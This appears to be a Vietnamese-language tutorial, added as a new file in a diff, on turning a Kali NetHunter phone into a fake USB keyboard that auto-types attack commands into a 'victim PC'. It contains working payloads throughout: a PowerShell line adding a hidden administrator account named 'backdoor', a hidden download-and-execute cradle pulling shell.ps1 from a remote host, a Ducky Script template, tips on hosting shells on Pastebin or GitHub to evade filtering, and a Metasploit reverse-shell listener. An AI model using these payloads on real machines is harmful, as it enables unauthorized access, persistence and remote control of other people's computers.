@@ -1,0 +1,98 @@
+🎯 MỤC TIÊU
+
+Biến điện thoại thành bàn phím ảo (HID) khi cắm vào máy tính, tự động gõ:
+
+    Lệnh tải mã độc
+
+    Lệnh mở backdoor
+
+    Tạo user admin, v.v.
+
+🧠 Không cần Wi-Fi hay mạng LAN, chỉ cần cắm vào máy tính qua USB.
+🟢 PHẦN 1: CƠ BẢN – GIẢ BÀN PHÍM VỚI NetHunter HID
+✅ Yêu cầu:
+
+    Máy đã cài Kali NetHunter FULL (đã chọn đúng khi flash LineageOS)
+
+    Dùng cáp OTG nếu cắm vào máy khác
+
+    Máy đích (PC) không khóa USB
+
+✅ Bước 1: Mở NetHunter App > HID Attacks
+
+    Chọn tab: USB HID Attacks
+
+    Chọn payload ví dụ:
+
+        Windows Reverse Shell
+
+        Open Powershell as Admin
+
+        Add Admin User
+
+    Nhấn nút “Launch Attack”
+
+✅ Bước 2: Cắm điện thoại vào máy tính (PC nạn nhân)
+
+    Sau vài giây, bạn sẽ thấy máy tính bị tự động gõ lệnh.
+
+    Ví dụ: mở cmd, tạo user, tải mã độc từ mạng...
+
+🟡 PHẦN 2: TRUNG CẤP – TẠO PAYLOAD CỦA RIÊNG BẠN
+✅ Payload mẫu tạo user admin:
+
+powershell -Command "net user backdoor Abc123456 /add && net localgroup administrators backdoor /add"
+
+✅ Payload mở reverse shell:
+
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')"
+
+Bạn tạo file .txt với các dòng lệnh → thêm vào thư mục payload của NetHunter:
+
+/data/data/com.offsec.nethunter/files/scripts/
+
+✅ Tạo GUI payload (mở Chrome + nhập link)
+
+Start-Process "chrome.exe" "http://yourdomain.com"
+
+🔴 PHẦN 3: NÂNG CAO – VIẾT PAYLOAD TỰ ĐỘNG, GIẤU HIỆU
+✅ 1. Dùng Ducky Script như USB Rubber Ducky
+
+NetHunter có thể biên dịch Ducky Script:
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -c "..."
+ENTER
+
+Chạy:
+
+duckify payload.txt > duck.bin
+
+✅ 2. Gửi payload lên cloud:
+
+Tải về shell từ Pastebin, GitHub, hoặc server của bạn để tránh lọc.
+✅ 3. Kết hợp với Metasploit:
+
+    Tạo file shell.ps1 bằng msfvenom
+
+    Lắng nghe bằng:
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+set LPORT 4444
+run
+
+📁 THƯ MỤC PAYLOAD MẶC ĐỊNH
+Đường dẫn	Chức năng
+/data/data/com.offsec.nethunter/files/scripts/	Payload HID custom
+/usr/share/nethunter-hid/	Payload gốc
+/sdcard/	Payload tải về
+🧠 TÓM TẮT
+Mức	Tác vụ	Công cụ
+Cơ bản	Gõ sẵn lệnh tạo user, shell	App NetHunter
+Trung cấp	Tự viết payload	Ducky Script
+Nâng cao	Gửi shell, bypass AV, metasploit	HID + Cloud + Lhost
